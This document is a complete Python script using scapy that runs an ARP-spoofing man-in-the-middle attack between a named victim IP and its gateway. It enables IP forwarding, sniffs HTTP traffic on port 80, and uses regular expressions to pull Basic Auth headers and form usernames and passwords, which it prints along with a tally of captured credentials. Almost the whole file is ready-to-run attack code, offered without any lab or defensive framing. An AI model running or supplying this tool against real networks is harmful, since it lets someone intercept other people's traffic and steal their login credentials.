#!/usr/bin/env python3
"""
arp_mitm_sniffer.py

Usage:
  sudo python arp_mitm_sniffer.py --victim 192.168.1.50 --gateway 192.168.1.1 --interface eth0

This script:
 1. Enables IP forwarding on the attacker's machine.
 2. Discovers MAC addresses for victim and gateway.
 3. Launches two threads:
    - ARP poisoning loop to intercept traffic.
    - Packet sniffer on port 80 to extract credentials.
 4. On Ctrl+C, it restores original ARP tables and disables IP forwarding.
"""

import argparse, threading, time, signal, sys, os, re
from scapy.all import ARP, Ether, send, srp, sniff, conf, get_if_hwaddr
from collections import defaultdict

# Regex patterns to extract credentials
BASIC_AUTH_RE = re.compile(r"Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)", re.IGNORECASE)
FORM_CRED_RE  = re.compile(
    rb"(?P<user>username|user|email)=([^&\r\n]+)&(?P<pass>password|pass)=([^&\r\n]+)",
    re.IGNORECASE
)

stop_event = threading.Event()
orig_ipfwd    = None
stats         = defaultdict(int)

def enable_ip_forwarding():
    global orig_ipfwd
    path = "/proc/sys/net/ipv4/ip_forward"
    with open(path, "r+") as f:
        orig_ipfwd = f.read().strip()
        f.seek(0); f.write("1"); f.truncate()
    print("[*] IP forwarding ENABLED")

def disable_ip_forwarding():
    if orig_ipfwd is None: return
    path = "/proc/sys/net/ipv4/ip_forward"
    with open(path, "w") as f:
        f.write(orig_ipfwd)
    print("[*] IP forwarding RESTORED to", orig_ipfwd)

def get_mac(ip, iface, timeout=2):
    """Send ARP request to get MAC of a given IP."""
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    ans, _ = srp(pkt, timeout=timeout, iface=iface, verbose=False)
    for _, r in ans:
        return r[Ether].src
    raise RuntimeError(f"Failed to get MAC for {ip}")

def poison(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface, interval=2):
    """Continuously send spoofed ARP responses."""
    arp_to_victim = ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                        psrc=gateway_ip, hwsrc=attacker_mac)
    arp_to_gw     = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                        psrc=victim_ip,    hwsrc=attacker_mac)
    print(f"[*] Starting ARP poison: {victim_ip} <-> {gateway_ip}")
    while not stop_event.is_set():
        send(arp_to_victim, iface=iface, verbose=False)
        send(arp_to_gw,     iface=iface, verbose=False)
        time.sleep(interval)

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac, iface):
    """Restore correct ARP mappings."""
    print("[*] Restoring ARP tables...")
    arp_victim = ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff",
                     psrc=gateway_ip, hwsrc=gateway_mac)
    arp_gw     = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
                     psrc=victim_ip,    hwsrc=victim_mac)
    # send multiple times to ensure restoration
    for _ in range(5):
        send(arp_victim, iface=iface, verbose=False)
        send(arp_gw,     iface=iface, verbose=False)
        time.sleep(1)
    print("[*] ARP tables restored.")

def packet_handler(pkt):
    """Extract and print HTTP credentials from a sniffed packet."""
    if not pkt.haslayer("TCP") or not pkt.haslayer("Raw"):
        return
    payload = bytes(pkt["Raw"].load)
    # Basic Auth
    for match in BASIC_AUTH_RE.finditer(payload.decode(errors="ignore")):
        creds = match.group(1)
        print(f"[+] BASIC AUTH DETECTED: {creds}")
        stats['basic'] += 1
    # Form credentials (username & password)
    fm = FORM_CRED_RE.search(payload)
    if fm:
        user = fm.group(2).decode(errors="ignore")
        pwd  = fm.group(4).decode(errors="ignore")
        print(f"[+] FORM LOGIN: user='{user}' pass='{pwd}'")
        stats['form'] += 1

def sniff_http(iface):
    """Sniff HTTP traffic on port 80 until stopped."""
    print("[*] Starting packet sniffer on port 80...")
    sniff(iface=iface, filter="tcp port 80", prn=packet_handler,
          stop_filter=lambda x: stop_event.is_set())

def signal_handler(sig, frame):
    print("\n[!] Caught interrupt, shutting down...")
    stop_event.set()

def main():
    parser = argparse.ArgumentParser(
        description="ARP MITM HTTP credential sniffer"
    )
    parser.add_argument("--victim",   required=True, help="Victim IP")
    parser.add_argument("--gateway",  required=True, help="Gateway IP")
    parser.add_argument("--interface", "-i", required=True, help="Network interface")
    parser.add_argument("--interval", "-t", type=int, default=2, help="Poisoning interval (s)")
    args = parser.parse_args()

    if os.geteuid() != 0:
        sys.exit("ERROR: Must run as root.")

    conf.iface = args.interface
    attacker_mac = get_if_hwaddr(args.interface)
    victim_mac   = get_mac(args.victim,  args.interface)
    gateway_mac  = get_mac(args.gateway, args.interface)

    print(f"[*] Attacker MAC: {attacker_mac}")
    print(f"[*] Victim MAC:   {victim_mac}")
    print(f"[*] Gateway MAC:  {gateway_mac}")

    # Setup
    enable_ip_forwarding()
    signal.signal(signal.SIGINT, signal_handler)

    # Start threads
    poison_thread = threading.Thread(
        target=poison, 
        args=(args.victim, victim_mac, args.gateway, gateway_mac, attacker_mac, args.interface, args.interval),
        daemon=True
    )
    sniff_thread  = threading.Thread(target=sniff_http, args=(args.interface,), daemon=True)
    poison_thread.start()
    sniff_thread.start()

    # Wait for interrupt
    while not stop_event.is_set():
        time.sleep(1)

    # Teardown
    restore(args.victim, victim_mac, args.gateway, gateway_mac, args.interface)
    disable_ip_forwarding()

    # Summary
    print(f"\n=== Captured Credentials Summary ===")
    print(f"Basic Auth headers: {stats['basic']}")
    print(f"Form logins     : {stats['form']}")
    print("Done.")

if __name__ == "__main__":
    main()
